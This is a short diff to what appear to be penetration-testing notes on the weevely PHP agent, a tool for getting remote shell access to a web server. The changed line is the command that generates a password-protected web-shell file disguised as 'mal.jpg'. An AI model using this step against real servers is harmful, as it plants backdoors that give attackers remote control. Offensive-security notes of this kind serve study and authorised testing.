@@ -8,7 +8,7 @@ Upload `weevely` PHP agent to a target web server to get remote shell access to 
 > [!info]+ weevely
 > ##### *Generate*
 > ```bash
-weevely generate password123 /home/usr/path/mal.jpg
+>weevely generate password123 /home/usr/path/mal.jpg
 > ```
 > ##### *Shell*
 >```bash
